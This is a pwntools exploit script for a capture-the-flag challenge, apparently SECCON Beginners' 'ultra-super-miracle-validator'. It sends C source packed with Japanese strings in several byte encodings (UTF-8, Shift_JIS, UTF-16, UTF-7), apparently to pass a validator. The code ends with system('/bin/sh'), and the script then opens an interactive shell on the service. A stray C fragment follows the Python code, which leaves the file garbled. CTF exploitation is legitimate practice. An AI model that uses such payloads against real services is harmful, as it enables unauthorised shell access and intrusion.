from pwn import *
import sys

io = process(["python", "main.py"])
# io = remote("ultra-super-miracle-validator.quals.beginners.seccon.jp", 5000)

# UTF-8
x1 = b'\xe3\x82\x89\xe3\x81\x9b\xe3\x82\x93\xe9\x9a\x8e\xe6\xae\xb5'
x2 = b'\xe3\x82\xab\xe3\x83\x96\xe3\x83\x88\xe8\x99\xab'
x3 = b'\xe5\xbb\x83\xe5\xa2\x9f\xe3\x81\xae\xe8\xa1\x97'
x4 = b'\xe3\x82\xa4\xe3\x83\x81\xe3\x82\xb8\xe3\x82\xaf\xe3\x81\xae\xe3\x82\xbf\xe3\x83\xab\xe3\x83\x88'
x5 = b'\xe3\x83\x89\xe3\x83\xad\xe3\x83\xad\xe3\x83\xbc\xe3\x82\xb5\xe3\x81\xb8\xe3\x81\xae\xe9\x81\x93'
x6 = b'\xe7\x89\xb9\xe7\x95\xb0\xe7\x82\xb9'
x7 = b'\xe3\x82\xb8\xe3\x83\xa7\xe3\x83\x83\xe3\x83\x88'
x8 = b'\xe5\xa4\xa9\xe4\xbd\xbf'
x9 = b'\xe7\xb4\xab\xe9\x99\xbd\xe8\x8a\xb1'
x10 = b'\xe7\xa7\x98\xe5\xaf\x86\xe3\x81\xae\xe7\x9a\x87\xe5\xb8\x9d'
# Shift_JIS
x11 = b'\x82\xe7\x82\xb9\x82\xf1\x8a\x4b\x92\x69'
x12 = b'\x83\x4a\x83\x75\x83\x67\x92\x8e'
x13 = b'\x94\x70\x9a\xd0\x82\xcc\x8a\x58'
x14 = b'\x83\x43\x83\x60\x83\x57\x83\x4e\x82\xcc\x83\x5e\x83\x8b\x83\x67'
x15 = b'\x83\x68\x83\x8d\x83\x8d\x81\x5b\x83\x54\x82\xd6\x82\xcc\x93\xb9'
x16 = b'\x93\xc1\x88\xd9\x93\x5f'
x17 = b'\x83\x57\x83\x87\x83\x62\x83\x67'
x18 = b'\x93\x56\x8e\x67'
x19 = b'\x8e\x87\x97\x7a\x89\xd4'
x20 = b'\x94\xe9\x96\xa7\x82\xcc\x8d\x63\x92\xe9'
x21 = b'\x30\x89\x30\x5b\x30\x93\x96\x8e\x6b\xb5'
x22 = b'\x30\x4b\x30\x76'
x23 = b'\x5e\xc3\x58\x9f\x30\x6e\x88\x57'
x24 = b'\x30\xa4\x30\xc1\x30\xb8\x30\xaf\x30\x6e\x30\xbf\x30\xeb\x30\xc8'
x25 = b'\x30\xc9\x30\xed\x30\xed\x30\xfc\x30\xb5\x30\x78\x30\x6e\x90\x53'
x26 = b'\x72\x79\x75\x70\x70\xb9'
x27 = b'\x30\xb8\x30\xe7\x30\xc3\x30\xc8'
x28 = b'\x59\x29\x4f\x7f'
x29 = b'\x7d\x2b\x96\x7d\x82\xb1'
x30 = b'\x79\xd8\x5b\xc6\x30\x6e\x76\x87\x5e\x1d'
x31 = b'\x2b\x4d\x49\x6b\x2d\x2b\x4d\x46\x73\x2d\x2b\x4d\x4a\x4d\x2d\x2b\x6c\x6f\x34\x2d'	
x32 = b'\x2b\x4d\x45\x73\x2d\x2b\x4d\x48'
x33 = b'\x2b\x58\x73\x4d\x2d\x2b\x57\x4a\x38\x2d\x2b\x4d\x47\x34\x2d\x2b'
x34 = b'\x2b\x4d\x4b\x51\x2d\x2b\x4d\x4d\x45\x2d\x2b\x4d\x4c\x67\x2d\x2b\x4d\x4b\x38\x2d\x2b\x4d\x47\x34\x2d\x2b\x4d\x4c\x38\x2d\x2b\x4d'
x35 = b'\x2b\x4d\x4d\x6b\x2d\x2b\x4d\x4f\x30\x2d\x2b\x4d\x4f\x30\x2d\x2b\x4d\x50\x77\x2d\x2b\x4d\x4c\x55\x2d\x2b\x4d\x48\x67\x2d\x2b\x4d'
x36 = b'\x2b\x63\x6e\x6b\x2d\x2b\x64\x58\x41\x2d\x2b\x63'
x37 = b'\x2b\x4d\x4c\x67\x2d\x2b\x4d\x4f\x63\x2d\x2b\x4d\x4d\x4d\x2d\x2b'
x38 = b'\x2b\x57\x53\x6b\x2d\x2b\x54\x33'
x39 = b'\x2b\x66\x53\x73\x2d\x2b\x6c\x6e\x30\x2d\x2b\x67'
x40 = b'\x2b\x65\x64\x67\x2d\x2b\x57\x38\x59\x2d\x2b\x4d\x47\x34\x2d\x2b\x64\x6f\x63\x2d'


l = [x3, x4, x9, x34, x36, x37, x38]

s = b'#include <stdlib.h> int main(){'
s += b'const char s[] = {0x83, 0x43, 0x83, 0x60, 0x83, 0x57, 0x83, 0x4e, 0x82, 0xcc, 0x83, 0x5e, 0x83, 0x8b, 0x83, 0x67, 0x72, 0x79, 0x75, 0x70, 0x70, 0xb9};'
s += b'char c[7][100000000] ={'

for i in range(len(l)):
    s += b'"'
    s += l[i]
    s += b'"'
    if i != len(l) - 1:
        s += b','

s += b'}; system("/bin/sh");}'

ret = io.readuntil("source:")
print(ret.decode())
print(s.decode())
io.sendline(s)


io.interactive()

int main(){const char s[] = {0xe5, 0xbb, 0x83, 0xe5, 0xa2, 0x9f, 0xe3, 0x81, 0xae,  0xe8, 0xa1, 0x97, 0xe3 ,0x82 ,0xa4 ,0xe3 ,0x83 ,0x81 ,0xe3 ,0x82 ,0xb8 ,0xe3 ,0x82 ,0xaf ,0xe3 ,0x81 ,0xae ,0xe3 ,0x82 ,0xbf ,0xe3 ,0x83 ,0xab ,0xe3 ,0x83, 0x88, 0x83, 0x43, 0x83, 0x60, 0x83, 0x57, 0x83, 0x4e, 0x82, 0xcc, 0x83, 0x5e, 0x83, 0x8b, 0x83, 0x67, 0x72, 0x79, 0x75, 0x70, 0x70, 0xb9, 0xe7 , 0xb4 , 0xab , 0xe9 , 0x99 , 0xbd , 0xe8 , 0x8a , 0xb1, 0x2b , 0x4d , 0x4b , 0x51 , 0x2d , 0x2b , 0x4d , 0x4d , 0x45 , 0x2d , 0x2b , 0x4d , 0x4c , 0x67 , 0x2d , 0x2b , 0x4d , 0x4b , 0x38 , 0x2d , 0x2b , 0x4d , 0x47 , 0x34 , 0x2d , 0x2b , 0x4d , 0x4c , 0x38 , 0x2d , 0x2b , 0x4d, 0x2b , 0x63 , 0x6e , 0x6b , 0x2d , 0x2b , 0x64 , 0x58 , 0x41 , 0x2d , 0x2b , 0x63 , 0x2b , 0x4d , 0x4c , 0x67 , 0x2d , 0x2b , 0x4d , 0x4f , 0x63 , 0x2d , 0x2b , 0x4d , 0x4d , 0x4d , 0x2d , 0x2b, 0x2b , 0x57 , 0x53 , 0x6b , 0x2d , 0x2b , 0x54 , 0x33 , 0x59 , 0x29 , 0x4f , 0x7f  , 0x2b , 0x66 , 0x53 , 0x73 , 0x2d , 0x2b , 0x6c , 0x6e , 0x30 , 0x2d , 0x2b , 0x67}; system("/bin/sh");}
